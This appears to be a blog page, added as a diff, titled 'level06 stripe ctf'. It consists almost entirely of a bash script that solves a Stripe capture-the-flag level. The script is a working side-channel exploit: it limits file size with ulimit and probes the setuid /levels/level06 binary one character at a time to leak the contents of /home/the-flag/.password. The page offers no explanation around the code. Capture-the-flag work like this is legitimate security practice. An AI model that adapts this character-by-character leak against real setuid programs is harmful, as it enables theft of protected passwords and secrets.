@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+
+    <title>level06 stripe ctf &middot; warrick.io</title>
+
+    <link rel="stylesheet" href="//warrick.io/css/jane.css">
+    <link rel="stylesheet" href="//warrick.io/css/syntax.css">
+    <link rel="stylesheet" href="//warrick.io/css/font-awesome.css">
+
+
+    <link href="" rel="alternate" type="application/rss+xml" title="warrick.io" />
+  </head>
+  <body>
+    
+  <h1>level06 stripe ctf</h1>
+  <span class="post-date">Wed, Feb 29, 2012</span>
+    <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/env bash
+</span><span class="cp"></span>
+<span class="nb">ulimit</span> -f <span class="m">1</span> <span class="c1"># set file size limit to 1024 bytes
+</span><span class="c1"></span>
+<span class="nv">s</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+<span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> 
+  <span class="k">for</span> <span class="o">((</span><span class="nv">i</span><span class="o">=</span><span class="m">32</span><span class="p">;</span> i &lt; <span class="m">127</span><span class="p">;</span> i++<span class="o">))</span><span class="p">;</span> <span class="k">do</span>
+    rm f o
+    <span class="nv">c</span><span class="o">=</span><span class="k">$(</span>ruby -e <span class="s2">&#34;print </span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">.chr&#34;</span><span class="k">)</span>
+    <span class="nv">t</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">s</span><span class="si">}${</span><span class="nv">c</span><span class="si">}</span><span class="s2">...&#34;</span>
+    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">t</span><span class="si">}</span><span class="s2">&#34;</span>
+
+    ruby -e <span class="s2">&#34;print &#39;A&#39; * (1024-33-</span><span class="si">${#</span><span class="nv">t</span><span class="si">}</span><span class="s2">+3)&#34;</span> &gt; f<span class="p">;</span>
+    /levels/level06 /home/the-flag/.password <span class="s2">&#34;</span><span class="si">${</span><span class="nv">t</span><span class="si">}</span><span class="s2">&#34;</span> <span class="m">2</span>&gt;&gt;f <span class="m">1</span>&gt;o<span class="p">;</span>
+
+    sleep <span class="m">0</span>.1 <span class="c1"># INCREASE LIBERALLY IF FALSE POSITIVES
+</span><span class="c1"></span>   
+    <span class="k">if</span> <span class="o">[</span> ! -s o <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="c1"># if file o is empty
+</span><span class="c1"></span>      <span class="nv">s</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">s</span><span class="si">}${</span><span class="nv">c</span><span class="si">}</span><span class="s2">&#34;</span>
+      <span class="nb">echo</span> -n <span class="nv">$c</span>
+      <span class="nb">break</span>
+    <span class="k">fi</span>
+  <span class="k">done</span>
+<span class="k">done</span></code></pre></div>
+  </div>
+
+  </body>
+</html>
